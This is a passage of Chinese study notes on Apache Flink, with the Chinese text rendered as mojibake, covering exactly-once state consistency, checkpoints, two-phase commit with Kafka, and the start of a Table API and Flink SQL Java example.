href="https://blog.csdn.net/qq_40180229/article/details/106445029">Flink-çŠ¶æ€ä¸€è‡´æ€§ | çŠ¶æ€ä¸€è‡´æ€§åˆ†ç±» | ç«¯åˆ°ç«¯çŠ¶æ€ä¸€è‡´æ€§ | å¹‚ç­‰å†™å…¥ | äº‹åŠ¡å†™å…¥ | WAL | 2PC</a></p></blockquote><h5 id="æ¦‚è¿°-4"><a href="#æ¦‚è¿°-4" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h5><p><img src="https://img-blog.csdnimg.cn/20200530181851687.png###id=mLBqB&originHeight=158&originWidth=688&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> æœ‰çŠ¶æ€çš„æµå¤„ç†ï¼Œå†…éƒ¨æ¯ä¸ªç®—å­ä»»åŠ¡éƒ½å¯ä»¥æœ‰è‡ªå·±çš„çŠ¶æ€ </li><li> å¯¹äºæµå¤„ç†å™¨å†…éƒ¨æ¥è¯´ï¼Œæ‰€è°“çš„çŠ¶æ€ä¸€è‡´æ€§ï¼Œå…¶å®å°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„è®¡ç®—ç»“æœè¦ä¿è¯å‡†ç¡®ã€‚ </li><li> ä¸€æ¡æ•°æ®ä¸åº”è¯¥ä¸¢å¤±ï¼Œä¹Ÿä¸åº”è¯¥é‡å¤è®¡ç®— </li><li> åœ¨é‡åˆ°æ•…éšœæ—¶å¯ä»¥æ¢å¤çŠ¶æ€ï¼Œæ¢å¤ä»¥åçš„é‡æ–°è®¡ç®—ï¼Œç»“æœåº”è¯¥ä¹Ÿæ˜¯å®Œå…¨æ­£ç¡®çš„ã€‚ </li></ul><h5 id="åˆ†ç±»"><a href="#åˆ†ç±»" class="headerlink" title="åˆ†ç±»"></a>åˆ†ç±»</h5><pre><code>**Flinkçš„ä¸€ä¸ªé‡å¤§ä»·å€¼åœ¨äºï¼Œå®ƒæ—¢ä¿è¯äº†exactly-onceï¼Œä¹Ÿå…·æœ‰ä½å»¶è¿Ÿå’Œé«˜ååçš„å¤„ç†èƒ½åŠ›ã€‚**</code></pre><ol><li> AT-MOST-ONCEï¼ˆæœ€å¤šä¸€æ¬¡ï¼‰<br>å½“ä»»åŠ¡æ•…éšœæ—¶ï¼Œæœ€ç®€å•çš„åšæ³•æ˜¯ä»€ä¹ˆéƒ½ä¸å¹²ï¼Œæ—¢ä¸æ¢å¤ä¸¢å¤±çš„çŠ¶æ€ï¼Œä¹Ÿä¸é‡æ’­ä¸¢å¤±çš„æ•°æ®ã€‚At-most-once è¯­ä¹‰çš„å«ä¹‰æ˜¯æœ€å¤šå¤„ç†ä¸€æ¬¡äº‹ä»¶ã€‚<br><em>è¿™å…¶å®æ˜¯æ²¡æœ‰æ­£ç¡®æ€§ä¿éšœçš„å§”å©‰è¯´æ³•â€”â€”æ•…éšœå‘ç”Ÿä¹‹åï¼Œè®¡ç®—ç»“æœå¯èƒ½ä¸¢å¤±ã€‚ç±»ä¼¼çš„æ¯”å¦‚ç½‘ç»œåè®®çš„udpã€‚</em> </li><li> AT-LEAST-ONCEï¼ˆè‡³å°‘ä¸€æ¬¡ï¼‰<br>åœ¨å¤§å¤šæ•°çš„çœŸå®åº”ç”¨åœºæ™¯ï¼Œæˆ‘ä»¬å¸Œæœ›ä¸ä¸¢å¤±äº‹ä»¶ã€‚è¿™ç§ç±»å‹çš„ä¿éšœç§°ä¸º at-least-onceï¼Œæ„æ€æ˜¯æ‰€æœ‰çš„äº‹ä»¶éƒ½å¾—åˆ°äº†å¤„ç†ï¼Œè€Œä¸€äº›äº‹ä»¶è¿˜å¯èƒ½è¢«å¤„ç†å¤šæ¬¡ã€‚<br><em>è¿™è¡¨ç¤ºè®¡æ•°ç»“æœå¯èƒ½å¤§äºæ­£ç¡®å€¼ï¼Œä½†ç»ä¸ä¼šå°äºæ­£ç¡®å€¼ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè®¡æ•°ç¨‹åºåœ¨å‘ç”Ÿæ•…éšœåå¯èƒ½å¤šç®—ï¼Œä½†æ˜¯ç»ä¸ä¼šå°‘ç®—ã€‚</em> </li><li> EXACTLY-ONCEï¼ˆç²¾ç¡®ä¸€æ¬¡ï¼‰</li></ol><p><strong>æ°å¥½å¤„ç†ä¸€æ¬¡æ˜¯æœ€ä¸¥æ ¼çš„ä¿è¯ï¼Œä¹Ÿæ˜¯æœ€éš¾å®ç°çš„ã€‚æ°å¥½å¤„ç†ä¸€æ¬¡è¯­ä¹‰ä¸ä»…ä»…æ„å‘³ç€æ²¡æœ‰äº‹ä»¶ä¸¢å¤±ï¼Œè¿˜æ„å‘³ç€é’ˆå¯¹æ¯ä¸€ä¸ªæ•°æ®ï¼Œå†…éƒ¨çŠ¶æ€ä»…ä»…æ›´æ–°ä¸€æ¬¡ã€‚</strong><br><em>è¿™æŒ‡çš„æ˜¯ç³»ç»Ÿä¿è¯åœ¨å‘ç”Ÿæ•…éšœåå¾—åˆ°çš„è®¡æ•°ç»“æœä¸æ­£ç¡®å€¼ä¸€è‡´ã€‚</em> </p><h5 id="ä¸€è‡´æ€§æ£€æŸ¥ç‚¹-Checkpoints"><a href="#ä¸€è‡´æ€§æ£€æŸ¥ç‚¹-Checkpoints" class="headerlink" title="ä¸€è‡´æ€§æ£€æŸ¥ç‚¹(Checkpoints)"></a>ä¸€è‡´æ€§æ£€æŸ¥ç‚¹(Checkpoints)</h5><ul><li>Flinkä½¿ç”¨äº†ä¸€ç§è½»é‡çº§å¿«ç…§æœºåˆ¶â€”â€”æ£€æŸ¥ç‚¹ï¼ˆcheckpointï¼‰æ¥ä¿è¯exactly-onceè¯­ä¹‰</li><li>æœ‰çŠ¶æ€æµåº”ç”¨çš„ä¸€è‡´æ£€æŸ¥ç‚¹ï¼Œå…¶å®å°±æ˜¯ï¼šæ‰€æœ‰ä»»åŠ¡çš„çŠ¶æ€ï¼Œåœ¨æŸä¸ªæ—¶é—´ç‚¹çš„ä¸€ä»½å¤‡ä»½ï¼ˆä¸€ä»½å¿«ç…§ï¼‰ã€‚è€Œè¿™ä¸ªæ—¶é—´ç‚¹ï¼Œåº”è¯¥æ˜¯æ‰€æœ‰ä»»åŠ¡éƒ½æ°å¥½å¤„ç†å®Œä¸€ä¸ªç›¸åŒçš„è¾“å…¥æ•°æ®çš„æ—¶é—´ã€‚</li><li>åº”ç”¨çŠ¶æ€çš„ä¸€è‡´æ£€æŸ¥ç‚¹ï¼Œæ˜¯Flinkæ•…éšœæ¢å¤æœºåˆ¶çš„æ ¸å¿ƒ</li></ul><h6 id="ç«¯åˆ°ç«¯-end-to-end-çŠ¶æ€ä¸€è‡´æ€§"><a href="#ç«¯åˆ°ç«¯-end-to-end-çŠ¶æ€ä¸€è‡´æ€§" class="headerlink" title="ç«¯åˆ°ç«¯(end-to-end)çŠ¶æ€ä¸€è‡´æ€§"></a>ç«¯åˆ°ç«¯(end-to-end)çŠ¶æ€ä¸€è‡´æ€§</h6><ul><li> ç›®å‰æˆ‘ä»¬çœ‹åˆ°çš„ä¸€è‡´æ€§ä¿è¯éƒ½æ˜¯ç”±æµå¤„ç†å™¨å®ç°çš„ï¼Œä¹Ÿå°±æ˜¯è¯´éƒ½æ˜¯åœ¨Flinkæµå¤„ç†å™¨å†…éƒ¨ä¿è¯çš„ï¼›è€Œåœ¨çœŸå®åº”ç”¨ä¸­ï¼Œæµå¤„ç†åº”ç”¨é™¤äº†æµå¤„ç†å™¨ä»¥å¤–è¿˜åŒ…å«äº†æ•°æ®æºï¼ˆä¾‹å¦‚Kafkaï¼‰å’Œè¾“å‡ºåˆ°æŒä¹…åŒ–ç³»ç»Ÿ </li><li> ç«¯åˆ°ç«¯çš„ä¸€è‡´æ€§ä¿è¯ï¼Œæ„å‘³ç€ç»“æœçš„æ­£ç¡®æ€§è´¯ç©¿äº†æ•´ä¸ªæµå¤„ç†åº”ç”¨çš„å§‹ç»ˆï¼›æ¯ä¸€ä¸ªç»„ä»¶éƒ½ä¿è¯äº†å®ƒè‡ªå·±çš„ä¸€è‡´æ€§ </li><li> <strong>æ•´ä¸ªç«¯åˆ°ç«¯çš„ä¸€è‡´æ€§çº§åˆ«å–å†³äºæ‰€æœ‰ç»„ä»¶ä¸­ä¸€è‡´æ€§æœ€å¼±çš„ç»„ä»¶</strong> </li></ul><h6 id="ç«¯åˆ°ç«¯-exactly-once"><a href="#ç«¯åˆ°ç«¯-exactly-once" class="headerlink" title="ç«¯åˆ°ç«¯ exactly-once"></a>ç«¯åˆ°ç«¯ exactly-once</h6><ul><li>å†…éƒ¨ä¿è¯â€”â€”checkpoint</li><li>sourceç«¯â€”â€”å¯é‡è®¾æ•°æ®çš„è¯»å–ä½ç½®</li><li>sinkç«¯â€”â€”ä»æ•…éšœæ¢å¤æ—¶ï¼Œæ•°æ®ä¸ä¼šé‡å¤å†™å…¥å¤–éƒ¨ç³»ç»Ÿ <ul><li>å¹‚ç­‰å†™å…¥</li><li>äº‹åŠ¡å†™å…¥</li></ul></li></ul><p>####### å¹‚ç­‰å†™å…¥</p><ul><li> æ‰€è°“å¹‚ç­‰æ“ä½œï¼Œæ˜¯è¯´ä¸€ä¸ªæ“ä½œï¼Œå¯ä»¥é‡å¤æ‰§è¡Œå¾ˆå¤šæ¬¡ï¼Œä½†åªå¯¼è‡´ä¸€æ¬¡ç»“æœæ›´æ”¹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåé¢å†é‡å¤æ‰§è¡Œå°±ä¸èµ·ä½œç”¨äº†ã€‚<br><em>ï¼ˆä¸­é—´å¯èƒ½ä¼šå­˜åœ¨ä¸æ­£ç¡®çš„æƒ…å†µï¼Œåªèƒ½ä¿è¯æœ€åç»“æœæ­£ç¡®ã€‚æ¯”å¦‚5=&gt;10=&gt;15=&gt;5=&gt;10=&gt;15ï¼Œè™½ç„¶æœ€åæ˜¯æ¢å¤åˆ°äº†15ï¼Œä½†æ˜¯ä¸­é—´æœ‰ä¸ªæ¢å¤çš„è¿‡ç¨‹ï¼Œå¦‚æœè¿™ä¸ªè¿‡ç¨‹èƒ½å¤Ÿè¢«è¯»å–ï¼Œå°±ä¼šå‡ºé—®é¢˜ã€‚ï¼‰</em> </li></ul><p><img src="https://img-blog.csdnimg.cn/2020053019091138.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=lRCMu&originHeight=228&originWidth=606&originalType=binary&ratio=1&status=done&style=none"></p><p>####### äº‹åŠ¡å†™å…¥</p><ul><li>äº‹åŠ¡ï¼ˆTransactionï¼‰ <ul><li>åº”ç”¨ç¨‹åºä¸­ä¸€ç³»åˆ—ä¸¥å¯†çš„æ“ä½œï¼Œæ‰€æœ‰æ“ä½œå¿…é¡»æˆåŠŸå®Œæˆï¼Œå¦åˆ™åœ¨æ¯ä¸ªæ“ä½œä¸­æ‰€ä½œçš„æ‰€æœ‰æ›´æ”¹éƒ½ä¼šè¢«æ’¤é”€</li><li>å…·æœ‰åŸå­æ€§ï¼šä¸€ä¸ªäº‹åŠ¡ä¸­çš„ä¸€ç³»åˆ—çš„æ“ä½œè¦ä¹ˆå…¨éƒ¨æˆåŠŸï¼Œè¦ä¹ˆä¸€ä¸ªéƒ½ä¸åš</li></ul></li><li> å®ç°æ€æƒ³</li></ul><p><strong>æ„å»ºçš„äº‹åŠ¡å¯¹åº”ç€checkpointï¼Œç­‰åˆ°checkpointçœŸæ­£å®Œæˆçš„æ—¶å€™ï¼Œæ‰æŠŠæ‰€æœ‰å¯¹åº”çš„ç»“æœå†™å…¥sinkç³»ç»Ÿä¸­</strong>ã€‚ </p><ul><li>å®ç°æ–¹å¼ <ul><li>é¢„ä¹ æ—¥å¿—</li><li>ä¸¤é˜¶æ®µæäº¤</li></ul></li></ul><p>######## é¢„å†™æ—¥å¿—(Write-Ahead-Logï¼ŒWAL)</p><ul><li>æŠŠç»“æœæ•°æ®å…ˆå½“æˆçŠ¶æ€ä¿å­˜ï¼Œç„¶ååœ¨æ”¶åˆ°checkpointå®Œæˆçš„é€šçŸ¥æ—¶ï¼Œä¸€æ¬¡æ€§å†™å…¥sinkç³»ç»Ÿ</li><li>ç®€å•æ˜“äºå®ç°ï¼Œç”±äºæ•°æ®æå‰åœ¨çŠ¶æ€åç«¯ä¸­åšäº†ç¼“å­˜ï¼Œæ‰€ä»¥æ— è®ºä»€ä¹ˆsinkç³»ç»Ÿï¼Œéƒ½èƒ½ç”¨è¿™ç§æ–¹å¼ä¸€æ‰¹æå®š</li><li>DataStream APIæä¾›äº†ä¸€ä¸ªæ¨¡ç‰ˆç±»ï¼šGenericWriteAheadSinkï¼Œæ¥å®ç°è¿™ç§äº‹åŠ¡æ€§sink</li></ul><p>######## ä¸¤é˜¶æ®µæäº¤(Two-Phase-Commitï¼Œ2PC)</p><ul><li>å¯¹äºæ¯ä¸ªcheckpointï¼Œsinkä»»åŠ¡ä¼šå¯åŠ¨ä¸€ä¸ªäº‹åŠ¡ï¼Œå¹¶å°†æ¥ä¸‹æ¥æ‰€æœ‰æ¥æ”¶åˆ°çš„æ•°æ®æ·»åŠ åˆ°äº‹åŠ¡é‡Œ</li><li>ç„¶åå°†è¿™äº›æ•°æ®å†™å…¥å¤–éƒ¨sinkç³»ç»Ÿï¼Œä½†ä¸æäº¤å®ƒä»¬â€”â€”è¿™æ—¶åªæ˜¯â€é¢„æäº¤â€</li><li><strong>è¿™ç§æ–¹å¼çœŸæ­£å®ç°äº†exactly-onceï¼Œå®ƒéœ€è¦ä¸€ä¸ªæä¾›äº‹åŠ¡æ”¯æŒçš„å¤–éƒ¨sinkç³»ç»Ÿ</strong>ã€‚Flinkæä¾›äº†TwoPhaseCommitSinkFunctionæ¥å£</li></ul><h6 id="ä¸åŒSourceå’ŒSinkçš„ä¸€è‡´æ€§ä¿è¯"><a href="#ä¸åŒSourceå’ŒSinkçš„ä¸€è‡´æ€§ä¿è¯" class="headerlink" title="ä¸åŒSourceå’ŒSinkçš„ä¸€è‡´æ€§ä¿è¯"></a>ä¸åŒSourceå’ŒSinkçš„ä¸€è‡´æ€§ä¿è¯</h6><p><img src="https://img-blog.csdnimg.cn/20200530194322578.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=aG7fq&originHeight=371&originWidth=650&originalType=binary&ratio=1&status=done&style=none"></p><h4 id="Flink-Kafka-ç«¯åˆ°ç«¯çŠ¶æ€ä¸€è‡´æ€§çš„ä¿è¯"><a href="#Flink-Kafka-ç«¯åˆ°ç«¯çŠ¶æ€ä¸€è‡´æ€§çš„ä¿è¯" class="headerlink" title="Flink+Kafka ç«¯åˆ°ç«¯çŠ¶æ€ä¸€è‡´æ€§çš„ä¿è¯"></a>Flink+Kafka ç«¯åˆ°ç«¯çŠ¶æ€ä¸€è‡´æ€§çš„ä¿è¯</h4><blockquote><p><a href="https://blog.csdn.net/qq_40180229/article/details/106445029">Flink-çŠ¶æ€ä¸€è‡´æ€§ | çŠ¶æ€ä¸€è‡´æ€§åˆ†ç±» | ç«¯åˆ°ç«¯çŠ¶æ€ä¸€è‡´æ€§ | å¹‚ç­‰å†™å…¥ | äº‹åŠ¡å†™å…¥ | WAL | 2PC</a></p></blockquote><ul><li>å†…éƒ¨â€”â€”åˆ©ç”¨checkpointæœºåˆ¶ï¼ŒæŠŠçŠ¶æ€å­˜ç›˜ï¼Œå‘ç”Ÿæ•…éšœçš„æ—¶å€™å¯ä»¥æ¢å¤ï¼Œä¿è¯å†…éƒ¨çš„çŠ¶æ€ä¸€è‡´æ€§</li><li>sourceâ€”â€”kafka consumerä½œä¸ºsourceï¼Œå¯ä»¥å°†åç§»é‡ä¿å­˜ä¸‹æ¥ï¼Œå¦‚æœåç»­ä»»åŠ¡å‡ºç°äº†æ•…éšœï¼Œæ¢å¤çš„æ—¶å€™å¯ä»¥ç”±è¿æ¥å™¨é‡åˆ¶åç§»é‡ï¼Œé‡æ–°æ¶ˆè´¹æ•°æ®ï¼Œä¿è¯ä¸€è‡´æ€§</li><li>sinkâ€”â€”kafka producerä½œä¸ºsinkï¼Œé‡‡ç”¨ä¸¤é˜¶æ®µæäº¤sinkï¼Œéœ€è¦å®ç°ä¸€ä¸ªTwoPhaseCommitSinkFunction</li></ul><h5 id="Exactly-once-ä¸¤é˜¶æ®µæäº¤"><a href="#Exactly-once-ä¸¤é˜¶æ®µæäº¤" class="headerlink" title="Exactly-once ä¸¤é˜¶æ®µæäº¤"></a>Exactly-once ä¸¤é˜¶æ®µæäº¤</h5><p><img src="https://img-blog.csdnimg.cn/20200530194434435.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=P4LSp&originHeight=280&originWidth=655&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>JobManager åè°ƒå„ä¸ª TaskManager è¿›è¡Œ checkpoint å­˜å‚¨</li><li>checkpointä¿å­˜åœ¨ StateBackendä¸­ï¼Œé»˜è®¤StateBackendæ˜¯å†…å­˜çº§çš„ï¼Œä¹Ÿå¯ä»¥æ”¹ä¸ºæ–‡ä»¶çº§çš„è¿›è¡ŒæŒä¹…åŒ–ä¿å­˜</li></ul><p><img src="https://img-blog.csdnimg.cn/20200530194627287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=qPTZZ&originHeight=280&originWidth=655&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>å½“ checkpoint å¯åŠ¨æ—¶ï¼ŒJobManager ä¼šå°†æ£€æŸ¥ç‚¹åˆ†ç•Œçº¿ï¼ˆbarrierï¼‰æ³¨å…¥æ•°æ®æµ</li><li>barrierä¼šåœ¨ç®—å­é—´ä¼ é€’ä¸‹å»</li></ul><p><img src="https://img-blog.csdnimg.cn/20200530194657186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=kcWtB&originHeight=310&originWidth=655&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>æ¯ä¸ªç®—å­ä¼šå¯¹å½“å‰çš„çŠ¶æ€åšä¸ªå¿«ç…§ï¼Œä¿å­˜åˆ°çŠ¶æ€åç«¯</li><li>checkpoint æœºåˆ¶å¯ä»¥ä¿è¯å†…éƒ¨çš„çŠ¶æ€ä¸€è‡´æ€§</li></ul><p><img src="https://img-blog.csdnimg.cn/20200530194835593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=rfSyY&originHeight=310&originWidth=655&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> æ¯ä¸ªå†…éƒ¨çš„ transform ä»»åŠ¡é‡åˆ° barrier æ—¶ï¼Œéƒ½ä¼šæŠŠçŠ¶æ€å­˜åˆ° checkpoint é‡Œ </li><li> sink ä»»åŠ¡é¦–å…ˆæŠŠæ•°æ®å†™å…¥å¤–éƒ¨ kafkaï¼Œ<strong>è¿™äº›æ•°æ®éƒ½å±äºé¢„æäº¤çš„äº‹åŠ¡</strong>ï¼›<strong>é‡åˆ° barrier æ—¶ï¼ŒæŠŠçŠ¶æ€ä¿å­˜åˆ°çŠ¶æ€åç«¯ï¼Œå¹¶å¼€å¯æ–°çš„é¢„æäº¤äº‹åŠ¡</strong><br><em>(barrierä¹‹å‰çš„æ•°æ®è¿˜æ˜¯åœ¨ä¹‹å‰çš„äº‹åŠ¡ä¸­æ²¡å…³é—­äº‹åŠ¡ï¼Œé‡åˆ°barrieråçš„æ•°æ®å¦å¤–æ–°å¼€å¯ä¸€ä¸ªäº‹åŠ¡)</em> </li></ul><p><img src="https://img-blog.csdnimg.cn/2020053019485194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=czcKT&originHeight=275&originWidth=655&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>å½“æ‰€æœ‰ç®—å­ä»»åŠ¡çš„å¿«ç…§å®Œæˆï¼Œä¹Ÿå°±æ˜¯è¿™æ¬¡çš„ checkpoint å®Œæˆæ—¶ï¼ŒJobManager ä¼šå‘æ‰€æœ‰ä»»åŠ¡å‘é€šçŸ¥ï¼Œç¡®è®¤è¿™æ¬¡ checkpoint å®Œæˆ</li><li>sink ä»»åŠ¡æ”¶åˆ°ç¡®è®¤é€šçŸ¥ï¼Œæ­£å¼æäº¤ä¹‹å‰çš„äº‹åŠ¡ï¼Œkafka ä¸­æœªç¡®è®¤æ•°æ®æ”¹ä¸ºâ€œå·²ç¡®è®¤â€</li></ul><h5 id="Exactly-once-ä¸¤é˜¶æ®µæäº¤æ­¥éª¤æ€»ç»“"><a href="#Exactly-once-ä¸¤é˜¶æ®µæäº¤æ­¥éª¤æ€»ç»“" class="headerlink" title="Exactly-once ä¸¤é˜¶æ®µæäº¤æ­¥éª¤æ€»ç»“"></a>Exactly-once ä¸¤é˜¶æ®µæäº¤æ­¥éª¤æ€»ç»“</h5><ol><li>ç¬¬ä¸€æ¡æ•°æ®æ¥äº†ä¹‹åï¼Œå¼€å¯ä¸€ä¸ª kafka çš„äº‹åŠ¡ï¼ˆtransactionï¼‰ï¼Œæ­£å¸¸å†™å…¥ kafka åˆ†åŒºæ—¥å¿—ä½†æ ‡è®°ä¸ºæœªæäº¤ï¼Œè¿™å°±æ˜¯â€œé¢„æäº¤â€</li><li>jobmanager è§¦å‘ checkpoint æ“ä½œï¼Œbarrier ä» source å¼€å§‹å‘ä¸‹ä¼ é€’ï¼Œé‡åˆ° barrier çš„ç®—å­å°†çŠ¶æ€å­˜å…¥çŠ¶æ€åç«¯ï¼Œå¹¶é€šçŸ¥ jobmanager</li><li>sink è¿æ¥å™¨æ”¶åˆ° barrierï¼Œä¿å­˜å½“å‰çŠ¶æ€ï¼Œå­˜å…¥ checkpointï¼Œé€šçŸ¥ jobmanagerï¼Œå¹¶å¼€å¯ä¸‹ä¸€é˜¶æ®µçš„äº‹åŠ¡ï¼Œç”¨äºæäº¤ä¸‹ä¸ªæ£€æŸ¥ç‚¹çš„æ•°æ®</li><li>jobmanager æ”¶åˆ°æ‰€æœ‰ä»»åŠ¡çš„é€šçŸ¥ï¼Œå‘å‡ºç¡®è®¤ä¿¡æ¯ï¼Œè¡¨ç¤º checkpoint å®Œæˆ</li><li>sink ä»»åŠ¡æ”¶åˆ° jobmanager çš„ç¡®è®¤ä¿¡æ¯ï¼Œæ­£å¼æäº¤è¿™æ®µæ—¶é—´çš„æ•°æ®</li><li>å¤–éƒ¨kafkaå…³é—­äº‹åŠ¡ï¼Œæäº¤çš„æ•°æ®å¯ä»¥æ­£å¸¸æ¶ˆè´¹äº†ã€‚</li></ol><h3 id="Table-APIå’ŒFlink-SQL"><a href="#Table-APIå’ŒFlink-SQL" class="headerlink" title="Table APIå’ŒFlink SQL"></a>Table APIå’ŒFlink SQL</h3><blockquote><p><a href="https://blog.csdn.net/qq_40180229/article/details/106457648">Flink-Table API å’Œ Flink SQLç®€ä»‹ | æ–°è€ç‰ˆæœ¬Flinkæ‰¹æµå¤„ç†å¯¹æ¯” | è¯»å–æ–‡ä»¶å’ŒKafkaæ¶ˆè´¹æ•°æ® | API å’Œ SQLæŸ¥è¯¢è¡¨</a></p><p><a href="https://blog.csdn.net/weixin_41956627/article/details/110050094">flink-Table&amp;sql-ç¢°åˆ°çš„å‡ ä¸ªé—®é¢˜è®°å½•</a></p></blockquote><h4 id="æ¦‚è¿°-5"><a href="#æ¦‚è¿°-5" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h4><ul><li>Flink å¯¹æ‰¹å¤„ç†å’Œæµå¤„ç†ï¼Œæä¾›äº†ç»Ÿä¸€çš„ä¸Šå±‚ API</li><li>Table API æ˜¯ä¸€å¥—å†…åµŒåœ¨ Java å’Œ Scala è¯­è¨€ä¸­çš„æŸ¥è¯¢APIï¼Œå®ƒå…è®¸ä»¥éå¸¸ç›´è§‚çš„æ–¹å¼ç»„åˆæ¥è‡ªä¸€äº›å…³ç³»è¿ç®—ç¬¦çš„æŸ¥è¯¢</li><li>Flink çš„ SQL æ”¯æŒåŸºäºå®ç°äº† SQL æ ‡å‡†çš„ Apache Calcite</li></ul><p><img src="https://img-blog.csdnimg.cn/20200531165328668.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=yGApT&originHeight=217&originWidth=651&originalType=binary&ratio=1&status=done&style=none"></p><h5 id="ä½¿ç”¨æ ·ä¾‹"><a href="#ä½¿ç”¨æ ·ä¾‹" class="headerlink" title="ä½¿ç”¨æ ·ä¾‹"></a>ä½¿ç”¨æ ·ä¾‹</h5><ul><li><p> å¯¼å…¥pomä¾èµ–ï¼Œ1.11.Xä¹‹åï¼Œæ¨èä½¿ç”¨blinkç‰ˆæœ¬  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Table API å’Œ Flink SQL --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-table-planner-blink_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p> javaæ ·ä¾‹ä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.tableapi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Table;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.bridge.java.StreamTableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.types.Row;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/3 5:47 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TableTest1_Example</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. è¯»å–æ•°æ®</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(<span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. è½¬æ¢æˆPOJO</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">     